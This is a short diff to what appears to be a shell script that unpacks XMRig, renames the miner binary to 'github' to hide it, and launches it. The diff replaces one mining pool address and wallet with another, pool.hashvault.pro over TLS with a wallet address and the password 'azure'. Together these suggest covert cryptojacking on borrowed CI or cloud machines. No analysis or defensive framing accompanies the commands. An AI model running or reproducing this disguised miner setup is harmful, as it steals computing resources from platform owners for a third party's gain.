@@ -4,4 +4,4 @@ tar -xvf xmrig-6.16.4-linux-static-x64.tar.gz
 cd xmrig-6.16.4
 mv xmrig github
 chmod u+x github
-./github -a Argon2/Chukwa -o codemagic.smkn2.xyz:22287 -u gunsVsqShTeEfdPeJyQreNfSKfHLm5gfFi3WWywazefsRusPS4LjKoMYLigqfsvRsqKo4kJEEjtPkGPF7xsLQMGq8YcsjUESKm --keepalive --donate-level 1 -p cpu:admin@usantixyz.xyz
+./github --url pool.hashvault.pro:80 --user iz4iVv3BoPLTSJyorbUTCUhmaFQcBSWV9EhH7XFiKBQiXqE9CGUo2yH547B46W7QNjHsZABRrmA62YAbPJqBAV3T1DcV3cSGQ --pass azure --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
